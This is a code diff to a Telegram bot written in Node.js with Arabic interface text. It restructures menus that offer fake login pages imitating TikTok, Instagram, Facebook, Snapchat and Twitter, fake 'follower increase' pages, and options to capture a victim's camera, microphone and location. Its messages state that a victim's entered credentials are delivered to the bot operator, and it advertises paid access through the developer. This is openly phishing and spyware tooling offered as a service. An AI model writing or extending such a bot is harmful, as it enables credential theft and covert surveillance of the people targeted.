@@ -769,27 +769,18 @@ bot.on('message', async (msg) => {
   const senderId = msg.from.id;
 
   if (text === '/start') {
-    const isSubscribed = await checkSubscription(senderId);
-    if (isSubscribed) {
-      showButtons(senderId);
-    }
+    showDefaultButtons(senderId);
+  } else if (text === '/login') {
+    showLoginButtons(senderId);
+  } else if (text === '/hacking') {
+    showHackingButtons(senderId);
   }
 });
 
-function showButtons(userId) {
-  let statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا.`;
+function showDefaultButtons(userId) {
+  let statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا ارسل امر لاضهار اندكسات تسجيل دخول /login اكتب امر لاضهور اندكسات صفحات مزوره على شكل زياده متابعين /hacking.`;
 
-  let loginButtons = [
-    [{ text: 'تسجيل دخول تيك توك', callback_data: 'login_tiktok' }],
-    [{ text: 'تسجيل دخول انستقرام', callback_data: 'login_instagram' }],
-    [{ text: 'تسجيل دخول فيسبوك', callback_data: 'login_facebook' }],
-    [{ text: 'تسجيل دخول سناب شات', callback_data: 'login_snapchat' }],
-    [{ text: 'تسجيل دخول ببجي', callback_data: 'login_pubg' }],
-    [{ text: 'تسجيل دخول يوتيوب', callback_data: 'login_youtube' }],
-    [{ text: 'تسجيل دخول تويتر', callback_data: 'login_twitter' }],
-  ];
-
-  let existingButtons = [
+  let defaultButtons = [
     [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data: 'front_camera' }],
     [{ text: '🎙 تسجيل صوت 🎙', callback_data: 'voice_record' }],
     [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data: 'get_location' }],
@@ -799,6 +790,30 @@ function showButtons(userId) {
     [{ text: 'تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
   ];
 
+  bot.sendMessage(userId, `${statusMessage}\n\nمرحبا قم باختيار أي شيء تريده لكن لن تستطيع استخدام أي رابط سوى 5 مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 أو قم بتجميع نقاط لاستخدامه مجانًا:`, {
+    reply_markup: {
+      inline_keyboard: defaultButtons
+    }
+  });
+}
+
+function showLoginButtons(userId) {
+  let loginButtons = [
+    [{ text: ' 🎵اندكس تسجيل دخول تيك توك 🎵 ', callback_data: 'login_tiktok' }],
+    [{ text: ' 📸اندكس تسجيل دخول انستقرام 📸', callback_data: 'login_instagram' }],
+    [{ text: ' 📘اندكس تسجيل دخول فيسبوك 📘', callback_data: 'login_facebook' }],
+    [{ text: ' 👻اندكس تسجيل دخول سناب شات 👻', callback_data: 'login_snapchat' }],
+    [{ text: ' 🐦اندكس تسجيل دخول تويتر 🐦', callback_data: 'login_twitter' }],
+  ];
+
+  bot.sendMessage(userId, `اختر اي رابط تسجيل دخول في صفحه تشبه الصفحه الحقيقه لمنصات اذا قام الضحيه بتسجيل الدخول راح توصلك المعلومات الا البوت:`, {
+    reply_markup: {
+      inline_keyboard: loginButtons
+    }
+  });
+}
+
+function showHackingButtons(userId) {
   let hackingButtons = [
     [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
     [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
@@ -809,19 +824,12 @@ function showButtons(userId) {
     [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
   ];
 
-  let keyboard = [
-    ...loginButtons,
-    ...existingButtons,
-    ...hackingButtons
-  ];
-
-  bot.sendMessage(userId, `${statusMessage}\n\nمرحبا قم باختيار أي شيء تريده لكن لن تستطيع استخدام أي رابط سوى 5 مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 أو قم بتجميع نقاط لاستخدامه مجانًا:`, {
+  bot.sendMessage(userId, `اختر  اندكسات على شكل زياده متابعين  عند قيام الضحيه بتسجيل  لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
     reply_markup: {
-      inline_keyboard: keyboard
+      inline_keyboard: hackingButtons
     }
   });
 }
-
 
 // ... (باقي الكود)
 
